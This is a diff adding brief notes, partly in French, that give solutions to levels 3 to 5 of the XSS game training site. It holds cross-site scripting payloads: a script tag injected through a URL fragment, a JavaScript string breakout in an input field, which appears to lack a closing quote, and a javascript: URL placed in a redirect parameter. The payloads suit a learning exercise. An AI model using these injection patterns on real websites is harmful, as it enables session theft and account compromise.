@@ -1,0 +1,5 @@
+Level 3 => https://xss-game.appspot.com/level3/frame#1'> <script>alert("hi")</script>
+
+Level 4 => dans l’input: 3');alert('hi)
+
+Level 5 => (https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()) cliquer sur go puis next
